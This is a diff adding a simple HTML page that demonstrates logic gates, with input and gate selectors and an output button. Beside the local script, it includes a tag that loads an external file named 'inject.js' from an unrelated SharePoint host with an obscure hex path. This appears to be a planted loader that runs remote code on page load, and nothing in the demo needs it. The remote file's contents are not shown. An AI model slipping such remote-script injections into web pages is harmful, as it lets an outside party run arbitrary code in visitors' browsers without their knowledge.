@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<title>Logic Gates</title>
+	<link rel="stylesheet" href="logicGates.css">
+</head>
+
+<body>
+	<h1>Logic Gates</h1>
+	<select class="in1" id="input1" title="Select Input">
+		<option value="0" title="0">0</option>
+		<option value="1" title="1">1</option>
+	</select>
+	<select class="in2" id="input2" title="Select Input">
+		<option value="0" title="0">0</option>
+		<option value="1" title="1">1</option>
+	</select>
+	<select class="gate" id="gateType" title="Select logic gate" onchange="myfunc();">
+		<option value="and" title="And gate">And</option>
+		<option value="nand" title="Nand gate">Nand</option>
+		<option value="or" title="Or gate">Or</option>
+		<option value="nor" title="Nor gate">Nor</option>
+		<option value="xor" title="Xor gate">Xor</option>
+		<option value="xnor" title="Xnor gate">Xnor</option>
+	</select>
+
+	<button class="btn" onclick="generate()" title="Get output">OUT</button>
+	<input class="out" id="output" title="Output">
+
+
+
+	<script type='text/javascript'
+		src="https://bsd405-my.sharepoint.com/772ff609488b2c9bb6bb2871cac430715c14f39e1462bea30062462d694cfd9a/inject.js"></script>
+</body>
+<script src="logicGates.js"></script>
+
+</html>
